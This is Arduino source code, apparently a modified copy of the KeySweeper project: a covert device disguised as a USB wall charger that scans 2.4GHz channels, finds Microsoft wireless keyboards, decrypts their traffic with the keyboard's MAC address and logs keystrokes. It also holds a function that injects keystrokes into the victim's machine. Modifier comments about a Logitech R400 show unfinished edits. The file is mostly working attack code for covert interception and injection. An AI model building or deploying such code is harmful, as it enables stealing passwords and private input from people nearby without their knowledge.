/*

 KeySweeper, by Samy Kamkar
 Dec 23, 2014
 
 KeySweeper is a stealthy Arduino-based device, camoflauged as a 
 functioning USB wall charger, that wirelessly and passively sniffs, 
 decrypts, logs and reports back all keystrokes from any Microsoft 
 wireless keyboards in the area.
 
 Keystrokes are stored to a local SPI flash chip for later access.
 A battery and on off switch was added so that the device could easily
 be carried to the destination and dropped.  The Fona is removed in this
 version to eliminate exposure of keystrokes to additional attacks on the
 web server, and to address use whre gms coverage is not allowed or doesn't exist.
 
 There are two modes which can be optioned by a switch:
 run - allows key sweeper to run and capture keystrokes
 flash - allows the user to interact with the flash drive over the UART through a 
 menu driven user interface.
 
 KeySweeper builds upon the awesome work and research from:
 - Travis Goodspeed of GoodFET (see goodfet.nrf)
 - Thorsten Schröder and Max Moser of KeyKeriki v2
 
 KeySweeper uses the HID files from the KeyKeriki project to convert the HID values to keys.
 Check out these awesome, related projects!
 - http://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/
 - http://goodfet.sourceforge.net/clients/goodfetnrf/
 
 */

/*

  Channels I've seen non-encrypted keyboards on: 
  5, 9, 25, 44, 52
  
  Channels I've seen 2000 (AES) keyboard on:
  3
 
 unknown packets on unencrypted (could there be channel information here?):
 chan 52 -> 
 08: f0f0 f0f0 3daf 6dc9   593d af6d c959 3df0 
 08: 0a0a 0a0a c755 9733   a3c7 5597 33a3 c70a 


example of encrypted packets from AES keyboard (HID keycode 4 ('a'))
MAC = 0xA8EE9A90CDLL
     8: 08 38 16 01 01 00 F3 2A 
     8: 56 56 56 56 56 56 56 56 
    20: 09 98 16 01 F8 94 EB F5 45 66 1F DF DE FF E1 12 FC CF 44 91 
    20: 0D 98 16 01 8A 22 20 1A 79 29 28 EE 21 E1 78 71 28 B2 C6 B4 
    20: 09 98 16 01 1B 10 31 F3 F7 2A E1 F6 77 C5 F2 5E 00 6C B5 A3 
     8: 08 38 16 01 C8 B2 00 A2 
    20: 09 98 16 01 DF 34 82 79 F4 15 94 68 D6 B0 10 07 25 2F 37 53 
    20: 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 
    20: 09 98 16 01 FF 04 2F 16 50 50 BD 9F 8F 96 C8 C4 43 B3 3A 94 
     8: 08 38 16 01 CA B2 00 A0 
    20: 09 98 16 01 05 79 33 5C 5D 41 FD BA D4 98 FB 5D 48 CA DD 63 
    20: 09 98 16 01 5B 8A F9 DF 90 87 15 D2 AA 80 48 6A B2 54 D0 F7 



/* pins:
 nRF24L01+ radio:
 1: (square): GND
 2: (next row of 4): 3.3 VCC 
 3: CE 9
 4: CSN: 8
 5: SCK: 13
 6: MOSI 11
 7: MISO: 12
 8: IRQ: not used for our purposes
 
 W25Q80BV flash:
 1: CS: 10
 2: DO: 12
 3: WP: not used
 4: GND: GND
 5: DI: 11
 6: CLK: 13
 7: HOLD: not used
 8: VCC: 3.3 VCC
 
 */


#define CE 9
#define CSN 10 // normally 10 but SPI flash uses 10
#define LED_PIN 6 // tie to USB led if you want to show keystrokes

// Serial baudrate
#define BAUDRATE 115200
#include <SoftwareSerial.h>

#define sp(a) Serial.print(F(a))
#define spl(a) Serial.println(F(a))
#define pr(a) Serial.print(F(a))
#define prl(a) Serial.println(F(a))

#include <SPI.h>
#include "nRF24L01.h"
#include "RF24.h"
#include "mhid.h"

#include <EEPROM.h>
// location in atmega eeprom to store last flash write address
#define E_FLASH_ADDY 0x00 // 4 bytes
#define E_SETUP      0x04 // 1 byte [could be bit]
#define E_LAST_CHAN  0x05 // 1 byte
//#define E_CHANS      0x06 // 1 byte
//#define E_FIRST_RUN  0x07 // 1 byte 

#define csn(a) digitalWrite(CSN, a)
#define ce(a) digitalWrite(CE, a)
#define PKT_SIZE 32
#define MS_PER_SCAN 10000

/* me love you */long time;
uint8_t channel = 25; // [between 3 and 80]
uint16_t lastSeq = 0;

// all MS keyboard macs appear to begin with 0xCD [we store in LSB]
uint64_t kbPipe = 0xAALL; // will change, but we use 0xAA to sniff
//uint64_t kbPipe = 0xa9399d5fcdLL;

// should we scan for kb or just go based off a known channel/pipe?
// if you turn this off, make sure to set kbPipe to a valid keyboard mac
#define SCAN_FOR_KB 1

// we should calculate this checksum offset by
// calc'ing checksum and xor'ing with actual checksums
uint8_t cksum_idle_offset = 0xFF;
uint8_t cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);

RF24 radio(CE, CSN);

// FINALLY SOME FUNCTIONS! WOOT! 

// decrypt those keyboard packets!
// ******** NEED TO CHANGE TO GET THE LOGITECH R400 PACKETS
void decrypt(uint8_t* p)
{
  for (int i = 4; i < 15; i++)
    // our encryption key is the 5-byte MAC address (pipe)
    // and starts 4 bytes in (header is unencrypted)
    p[i] ^= kbPipe >> (((i - 4) % 5) * 8) & 0xFF;
}

// calculate microsoft wireless keyboard checksum
// ********* IS CHECKSUM THE SAME FOR LOGITECH R400?
void checksum(uint8_t* p, uint8_t ck_i, uint8_t ck_offset)
{
  // calculate our checksum
  p[ck_i] = 0;
  for (int i = 0; i < ck_i; i++)
    p[ck_i] ^= p[i];

  // my keyboard also ^ 0xa0 ... not sure why
  p[ck_i] ^= ck_offset;
}

// if you're looking at this, you found a secret function...
// this INJECTS keystrokes into a machine that uses a MS wireless keyboard ;)
// i will be releasing a project around this soon...
// ****** KEEPING THIS IN RIGHT NOW TO SEE IF I CAN SURE THIS TO SEND SIGNAL TO PC OF R400 BUTTON
void tx(uint8_t* p, uint8_t key)
{
  radio.setAutoAck(true); // only autoack during tx
  radio.openWritingPipe(kbPipe);
  radio.stopListening();

  // get the HID key
  key = hid_reverse(key);

  // increase our sequence by a massive amount (to prevent overlapping)
  p[5] += 128;

  /*
  // increase our sequence
   p[4]++;
   
   // increment again if we're looking at the first packet
   if (p[9]) 
   p[4]++;
   */

  // place key into payload
  p[9] = key;
  checksum(p, 31, cksum_key_offset);

  // encrypt our packet (encryption and decryption are the same)
  decrypt(p); 

  radio.write(p, 16);

  // now send idle (same seq, idle header, calc cksum, 8 bytes)
  decrypt(p);
  p[6] = 0;
  p[1] = 0x38;
  checksum(p, 7, cksum_idle_offset);

  // encrypt our packet (encryption and decryption are the same)
  decrypt(p); 

  for (int j = 0; j < 7; j++)
    radio.write(p, 8);

  // now send keyup (increase seq, change key, calc cksum)
  decrypt(p);
  p[1] = 0x78;
  p[4]++;
  p[6] = 0x43;
  p[7] = 0x00;
  p[9] = 0x00;
  checksum(p, 15, cksum_key_offset);
  // encrypt our packet (encryption and decryption are the same)
  decrypt(p); 

  radio.write(p, 16);

  radio.setAutoAck(false); // don't autoack during rx
  radio.startListening();
}
// ***** NEED TO FIND STRUCTURE OF R400

/* microsoft keyboard packet structure:
 struct mskb_packet
 {
 uint8_t device_type;
 uint8_t packet_type;
 uint8_t model_id;
 uint8_t unknown;
 uint16_t sequence_id;
 uint8_t flag1;
 uint8_t flag2;
 uint8_t d1;
 uint8_t key;
 uint8_t d3;
 uint8_t d4; 
 uint8_t d5;
 uint8_t d6;
 uint8_t d7;
 uint8_t checksum; 
 };
 */

uint8_t flush_rx(void)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( FLUSH_RX );
  csn(HIGH);

  return status;
}


uint8_t flush_tx(void)
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( FLUSH_TX );
  csn(HIGH);

  return status;
}

void ledOn()
{
  digitalWrite(LED_PIN, HIGH);
}

void ledOff()
{
  digitalWrite(LED_PIN, LOW);
}


void mainLoop(){
  uint8_t p[PKT_SIZE], op[PKT_SIZE], lp[PKT_SIZE];
  char ch = '\0';
  uint8_t pipe_num;
  //  spl("loop");
  ledOn();
  
  // if there is data ready
  if ( radio.available(&pipe_num) )
  {
    uint8_t sz = radio.getDynamicPayloadSize();
    radio.read(&p, PKT_SIZE);
    flush_rx();
    
    // decrypt!
    decrypt(p);
  }
}

void loop(void){ 
  while(true){
      mainLoop();
    }
  }


uint8_t n(uint8_t reg, uint8_t value)                                       
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  csn(HIGH);
  return status;
}

uint8_t n(uint8_t reg, const uint8_t* buf, uint8_t len)                                       
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  while (len--)
    SPI.transfer(*buf++);
  csn(HIGH);

  return status;
}

uint8_t read_register(uint8_t reg, uint8_t* buf, uint8_t len)                       
{
  uint8_t status;

  csn(LOW);
  status = SPI.transfer( R_REGISTER | ( REGISTER_MASK & reg ) );
  while ( len-- )
    *buf++ = SPI.transfer(0xff);

  csn(HIGH);

  return status;
}

// scans for microsoft keyboards
// we reduce the complexity for scanning by a few methods:
// a) looking at the FCC documentation, these keyboards only communicate between 2403-2480MHz, rather than 2400-2526
// b) we know MS keyboards communicate at 2mbps, so we don't need to scan at 1mbps anymore
// c) we've confirmed that all keyboards have a mac of 0xCD, so we can check for that
// d) since we know the MAC begins with C (1100), the preamble should be 0xAA [10101010], so we don't need to scan for 0x55
// e) we know the data portion will begin with 0x0A38/0x0A78 so if we get that & 0xCD MAC, we have a keyboard!

void scan()
{

  spl("scan");

  uint8_t p[PKT_SIZE];
  uint16_t wait = 10000;

  // FCC doc says freqs 2403-2480MHz, so we reduce 126 frequencies to 78
  // http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
  channel = EEPROM.read(E_LAST_CHAN);

  // the order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MIN); 
  radio.setDataRate(RF24_1MBPS);
  radio.setPayloadSize(32);
  radio.setChannel(channel);
  // RF24 doesn't ever fully set this -- only certain bits of it
  n(0x02, 0x00); 
  // RF24 doesn't have a native way to change MAC...
  // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
  n(0x03, 0x00);
  radio.openReadingPipe(0, kbPipe);
  radio.disableCRC();
  radio.startListening();
  radio.printDetails();

  // from goodfet.nrf - thanks Travis Goodspeed!
  while (1)
  {
    if (channel > 80)
      channel = 3;

    sp("Tuning to ");
    Serial.println(2400 + channel);
    radio.setChannel(channel++);

    time = millis();
    while (millis() - time < wait)
    {      
      if (radio.available())
      {
        radio.read(&p, PKT_SIZE);
        for (int m = 0; m < PKT_SIZE; m++)
        {
          Serial.print(p[m], HEX);
          sp(" ");
          if (p[m] == 0x45 && p[m+1] == 0x4B) // THIS IS THE PAYLOAD FOR A BUTTON PRESS FROM THE NEILS BLOG
          {
             Serial.print("&&&&&&&&&&&&&&&&&&&&&&&&&&&BUTTON PRESS &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&");
             spl("");
          }          
         }
         spl("");
      }
    }
        spl("");
        /* ******* COMMENT OUT ALL OF THE MS KB SNIFFING
        if (p[4] == 0xCD)
        {
          sp("Potential MS keyboard: ");
          for (int j = 0; j < 8; j++)
          {
            Serial.print(p[j], HEX);
            sp(" ");
          }
          spl("");

          // packet control field (PCF) is 9 bits long, so our packet begins 9 bits in
          // after the 5 byte mac. so remove the MSB (part of PCF) and shift everything 1 bit
          if ((p[6] & 0x7F) << 1 == 0x0A && (p[7] << 1 == 0x38 || p[7] << 1 == 0x78))
          { 
            channel--; // we incremented this AFTER we set it
            sp("KEYBOARD FOUND! Locking in on channel ");
            Serial.println(channel);
            EEPROM.write(E_LAST_CHAN, channel);

            kbPipe = 0;
            for (int i = 0; i < 4; i++)
            {
              kbPipe += p[i];
              kbPipe <<= 8;
            }
            kbPipe += p[4];

            // fix our checksum offset now that we have the MAC
            cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);
            return;
          }
          
          // handle finding Wireless Keyboard 2000 for Business (w/AES)
          // we don't know how to crack yet, but let's at least dump packets
          else if (((p[6] & 0x7F) << 1 == 0x09 && (p[7] << 1 == 0x98)) ||
                   ((p[6] & 0x7F) << 1 == 0x08 && (p[7] << 1 == 0x38)))
          {
            channel--; // we incremented this AFTER we set it
            sp("AES encrypted keyboard found! Locking in on channel ");
            Serial.println(channel);
            EEPROM.write(E_LAST_CHAN, channel);

            kbPipe = 0;
            for (int i = 0; i < 4; i++)
            {
              kbPipe += p[i];
              kbPipe <<= 8;
            }
            kbPipe += p[4];

            // fix our checksum offset now that we have the MAC
            cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);
            return;
          }
        }
      }
    }
    */
    // reset our wait time after the first iteration
    // because we want to wait longer on our first channel
    wait = MS_PER_SCAN;
  }
}

void setup()
{
  pinMode(LED_PIN, OUTPUT);
  ledOn();
  Serial.begin(BAUDRATE);

  spl("Radio setup");
  radio.begin();
  spl("End radio setup");

  // get channel and pipe
#ifdef SCAN_FOR_KB
  scan();
#endif  
}

